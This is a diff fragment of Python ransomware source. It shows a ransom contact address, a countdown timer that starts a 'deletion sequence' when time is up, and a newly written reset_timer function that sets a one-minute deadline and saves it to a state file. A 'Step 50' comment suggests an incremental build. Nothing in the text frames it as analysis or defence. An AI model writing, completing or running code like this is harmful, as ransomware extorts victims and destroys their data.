@@ -9,7 +9,7 @@ import sys
 from base64 import b64encode, b64decode
 import base64
 from ctypes import windll
-from datetime import datetime
+from datetime import datetime, timedelta
 from json import dumps
 from os import makedirs, path, remove, walk
 # import tkinter as tk
@@ -1031,9 +1031,12 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             self.timerLabel.config(text="Time is UP")
             self.begin_deletion_sequence()
 
-
+    # Step 50: Function to resting the timer
     def reset_timer(self):
-        pass
+        self.closingTime = datetime.now() + timedelta(minutes=1)
+        with open(TIMER_STATE_FILE, 'w') as file:
+            file.write(str(self.closingTime.timestamp()))
+        self.update_timer()
 
     def delete_timer_and_machine_id_files(self):
         pass
